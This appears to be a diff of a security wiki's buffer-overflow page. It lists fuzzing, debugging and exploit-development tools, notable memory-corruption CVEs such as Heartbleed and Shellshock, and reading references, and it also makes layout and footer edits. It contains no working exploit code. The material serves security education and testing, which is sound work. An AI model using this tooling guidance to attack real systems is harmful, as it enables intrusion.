+					<td>Recon</td>
+					<td>TLS-layer overflow surface identification (Heartbleed, POODLE)</td>
+			</tr>
+			<tr>
+					<td><code>AFL++</code></td>
+					<td>Fuzzing</td>
+					<td>Coverage-guided fuzzing of native server components and parsers</td>
+			</tr>
+			<tr>
+					<td><code>libFuzzer</code></td>
+					<td>Fuzzing</td>
+					<td>In-process fuzzing for C/C++ libraries (integrate with ASAN)</td>
+			</tr>
+			<tr>
+					<td><code>Boofuzz</code></td>
+					<td>Fuzzing</td>
+					<td>Network-level HTTP/WebSocket protocol fuzzing</td>
+			</tr>
+			<tr>
+					<td><code>Burp Suite</code></td>
+					<td>Web Proxy</td>
+					<td>Manual overflow probing via Intruder; response analysis</td>
+			</tr>
+			<tr>
+					<td><code>OWASP ZAP</code></td>
+					<td>Scanner</td>
+					<td>Automated buffer overflow active scan across HTTP parameters</td>
+			</tr>
+			<tr>
+					<td><code>GDB + pwndbg</code></td>
+					<td>Debugger</td>
+					<td>Dynamic analysis; crash triage; ROP chain development</td>
+			</tr>
+			<tr>
+					<td><code>ROPgadget</code></td>
+					<td>Exploit Dev</td>
+					<td>ROP gadget discovery in server binaries and libraries</td>
+			</tr>
+			<tr>
+					<td><code>Pwntools</code></td>
+					<td>Exploit Dev</td>
+					<td>Python exploit scripting framework for binary exploitation</td>
+			</tr>
+			<tr>
+					<td><code>Valgrind</code></td>
+					<td>Memory Analysis</td>
+					<td>Runtime memory error detection (out-of-bounds, use-after-free)</td>
+			</tr>
+			<tr>
+					<td><code>AddressSanitizer (ASAN)</code></td>
+					<td>Memory Analysis</td>
+					<td>Compile-time instrumentation for precise overflow detection</td>
+			</tr>
+			<tr>
+					<td><code>checksec</code></td>
+					<td>Recon</td>
+					<td>Enumerate binary protections (NX, ASLR, canary, PIE, RELRO)</td>
+			</tr>
+			<tr>
+					<td><code>Nmap NSE</code></td>
+					<td>Recon</td>
+					<td><code>http-shellshock</code>, <code>ssl-heartbleed</code> scripts for known CVE detection</td>
+			</tr>
+			<tr>
+					<td><code>Metasploit</code></td>
+					<td>Exploitation</td>
+					<td>Modules for Heartbleed, Shellshock, and historical web server CVEs</td>
+			</tr>
+	</tbody>
 </table>
-<h2 id="good-to-read">
-  Good To Read
-  <a class="anchor" href="#good-to-read">#</a>
-</h2>
-<h3 id="reports">
-  Reports
-  <a class="anchor" href="#reports">#</a>
-</h3>
+<h2 id="good-to-read">Good To Read<a class="anchor" href="#good-to-read">#</a></h2>
+<h3 id="reports">Reports<a class="anchor" href="#reports">#</a></h3>
 <ul>
 <li><a href="https://www.sentinelone.com/vulnerability-database/cve-2023-3824/" target="_blank" rel="noreferrer noopener nofollow">**CVE-2023-3824: PHP PHAR Buffer Overflow Vulnerability</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">**</li>
 <li><a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwiGl46GkrWTAxW9WHADHapqBcUQFnoECBoQAQ&amp;url=https%3A%2F%2Fwww.rapid7.com%2Fblog%2Fpost%2F2017%2F02%2F24%2Fcloudflare-data-leakage-or-dare-i-saycloudbleed%2F&amp;usg=AOvVaw2p4XCHXj-RB_zSecfRZXF7&amp;opi=89978449" target="_blank" rel="noreferrer noopener nofollow"><strong>Cloudflare (Cloudbleed, 2017 — Public Disclosure):</strong> Buffer over-read in Cloudflare&rsquo;s HTML parser (<code>cf-html</code> module) leaked memory from adjacent HTTP requests — exposed tokens, cookies, and private data of unrelated users.</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwjdw46qkrWTAxW1a2wGHZBoDZMQFnoECBsQAQ&amp;url=https%3A%2F%2Fwww.sentinelone.com%2Fvulnerability-database%2Fcve-2022-28739%2F&amp;usg=AOvVaw2BxFihmOvl8RhG_13r_Uc3&amp;opi=89978449" target="_blank" rel="noreferrer noopener nofollow"><strong>Ruby on Rails:</strong> Integer overflow in <code>String#*</code> leading to heap buffer overflow when processing attacker-controlled multiplier values in a templating context.</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 </ul>
-<h3 id="cves-worth-studying">
-  CVEs Worth Studying
-  <a class="anchor" href="#cves-worth-studying">#</a>
-</h3>
+<h3 id="cves-worth-studying">CVEs Worth Studying<a class="anchor" href="#cves-worth-studying">#</a></h3>
 <ul>
 <li><strong>CVE-2014-0160 (Heartbleed):</strong> Heap over-read in OpenSSL TLS Heartbeat — the definitive web-layer memory disclosure vulnerability.</li>
 <li><strong>CVE-2014-6271 (Shellshock):</strong> Bash environment variable buffer confusion exploitable via HTTP headers in CGI deployments.</li>
@@ -1794,10 +1665,7 @@ GET /video.mp4?start=&lt;crafted_float&gt; HTTP/1.1
 <li><strong>CVE-2022-41741 (Nginx mp4 module):</strong> Stack overflow in Nginx&rsquo;s mp4 streaming module via crafted <code>start</code> parameter.</li>
 <li><strong>CVE-2023-4863 (libwebp):</strong> Heap buffer overflow in WebP decoding — affected Chrome, Pillow, Electron, and every app using libwebp.</li>
 </ul>
-<h2 id="references">
-  References
-  <a class="anchor" href="#references">#</a>
-</h2>
+<h2 id="references">References<a class="anchor" href="#references">#</a></h2>
 <ul>
 <li><a href="https://owasp.org/www-community/attacks/Buffer_overflow_attack" target="_blank" rel="noreferrer noopener nofollow">OWASP Buffer Overflow Attack</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" rel="noreferrer noopener nofollow">OWASP Testing Guide — OTG-INPVAL-014: Buffer Overflow Testing</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
@@ -1818,49 +1686,62 @@ GET /video.mp4?start=&lt;crafted_float&gt; HTTP/1.1
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Buffer%20Overflow.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/Broken-Function-Level-Authorization-BFLA/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Broken Function Level Authorization</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/Business-logic-Vulnerabilities/" class="flex align-center">
+        <span>Business Logic</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -1925,15 +1806,24 @@ GET /video.mp4?start=&lt;crafted_float&gt; HTTP/1.1
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
